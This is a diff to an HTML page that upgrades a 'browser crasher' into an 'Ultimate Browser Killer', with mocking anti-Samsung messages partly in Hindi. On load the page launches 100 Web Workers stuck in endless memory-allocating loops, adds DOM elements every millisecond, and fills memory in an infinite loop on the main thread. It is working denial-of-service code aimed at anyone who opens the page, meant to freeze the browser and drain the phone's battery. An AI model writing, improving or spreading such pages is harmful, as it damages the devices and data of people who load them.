@@ -1,38 +1,53 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>Powerful Browser Crasher</title>
+    <title>Ultimate Browser Killer</title>
     <script>
-      // Function to create Web Worker that runs infinite loop
-      function createCrasher() {
-        const blob = new Blob([
-          `onmessage = function() {
-              while (true) {
-                let x = Math.random() * Math.random();
+      function createUltraCrasher() {
+        const blob = new Blob([`
+          onmessage = function() {
+            while (true) {
+              let data = [];
+              for (let i = 0; i < 100000; i++) {
+                data.push(Math.random());
               }
-          }`
-        ], { type: 'application/javascript' });
+            }
+          }
+        `], { type: 'application/javascript' });
 
         const worker = new Worker(URL.createObjectURL(blob));
         worker.postMessage('start');
       }
 
+      function spamDOM() {
+        setInterval(() => {
+          let div = document.createElement("div");
+          div.innerText = "Samsung is worst company ever! Crash incoming!";
+          document.body.appendChild(div);
+        }, 1);
+      }
+
       window.onload = function () {
-        // Run multiple web workers to fully fry browser
-        for (let i = 0; i < 50; i++) {
-          createCrasher();
+        // DOM Spam
+        spamDOM();
+
+        // Create 100 heavy workers
+        for (let i = 0; i < 100; i++) {
+          createUltraCrasher();
         }
 
-        // Also run infinite loop on main thread
+        // Main thread infinite RAM hog
+        let arr = [];
         while (true) {
-          let x = Math.random() * Math.random();
-          console.log("Samsung bekaar company hai!");
+          for (let i = 0; i < 10000; i++) {
+            arr.push(new Array(1000).fill("Samsung = Lag!"));
+          }
         }
       };
     </script>
   </head>
   <body>
-    <h1>Browser Doom Activated!</h1>
-    <p>Samsung = Crash + Lag + Heat = Disaster!</p>
+    <h1>BHAI! Yeh Samsung ka phone gaya kaam se!</h1>
+    <p>Browser... Battery... Sabko bye bol de!</p>
   </body>
 </html>
